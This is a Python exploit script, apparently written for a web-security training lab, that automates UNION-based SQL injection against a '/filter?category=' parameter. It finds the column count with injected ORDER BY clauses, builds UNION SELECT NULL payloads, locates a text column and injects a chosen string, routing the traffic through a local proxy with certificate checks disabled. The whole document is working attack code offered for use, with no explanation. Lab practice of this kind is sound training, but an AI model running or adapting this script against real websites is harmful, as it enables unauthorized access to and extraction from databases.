import requests
import urllib3
import sys
#   dedoxd2

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
    }
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



def append_nulls_to_payload(payload , number_of_nulls ,):
    while number_of_nulls > 0:
        number_of_nulls -=1
        payload += "NULL , "
    payload = payload[0:len(payload)-2]

    payload += " --"

    return payload



def determine_columns_number(url: str):
    print("(+) Determining the number of columns ...")
    counter = 1
    while True:
        base_url  = url + f"' order by {counter} --"
        response = requests.get(base_url, verify=False, proxies=proxies)
        if response.status_code != 200:
            print(f"(+) Number of columns = {counter -1}") # breaks the loop when raising error so the last number should be - 1
            return counter -1
        counter +=1


def retrive_string_values (null_payload : str ,columns_number : int, string_value : str) :
    try:
        n = columns_number
        print("(+) Starts to determine the string column...")

        for i in range(n):
            temp_payload = null_payload.split(",")
            temp_payload[i] = temp_payload[i].replace("NULL","'A'")
            new_payload = " , ".join(index for index in temp_payload)
            print(f"(+) Current Tested payload is {new_payload}")
            response = requests.get(new_payload,verify=False, proxies=proxies)
            if response.status_code == 200:
                print("(+) We have determined the string Column !!")
                print(f"(+) the string Column is no.{i+1} ")
                print(f"(+) Starts to retrive given String value {string_value}")
                temp_payload = null_payload.split(",")
                temp_payload[i] = temp_payload[i].replace("NULL",string_value)


                new_payload = " , ".join(index for index in temp_payload)
                print(f"(+) Final payload is {new_payload}")
                exploitation_response = requests.get(new_payload,verify=False, proxies=proxies)
                if exploitation_response.status_code == 200:
                    return True
                else:
                    return False



    except RuntimeError :
        print(RuntimeError)


def exploit_sqli(url: str,string_value: str):
    print("(+) Exploitation Starts !!")
    uri = "/filter?category=Accessories"
    number_of_clumns = determine_columns_number(url+uri)
    n = number_of_clumns
    payload = url + uri +"' UNION SELECT "

    while number_of_clumns > 0:
        number_of_clumns -=1
        payload += "NULL , "
    payload = payload[0:len(payload)-2]

    payload += " --"
    print(f"(+) Base payload is {payload}")



    if retrive_string_values(payload ,n, string_value ) :
        print("(+) Exploitation Done Successfully...")
    else:
        print("(-) Exploitation Failed :'( ")




if __name__ == "__main__":
    try:
        url = sys.argv[1]
        string_value = sys.argv[2]
        exploit_sqli(url,string_value)
    except RuntimeError:
        print(RuntimeError)
        print("(-) Usage: %s <url> \"'your_string'\"  "%sys.argv[0])
        print("(-) Example: %s https://www.example.com  \"jhpQzd'\" " %sys.argv[0])
        sys.exit(-1)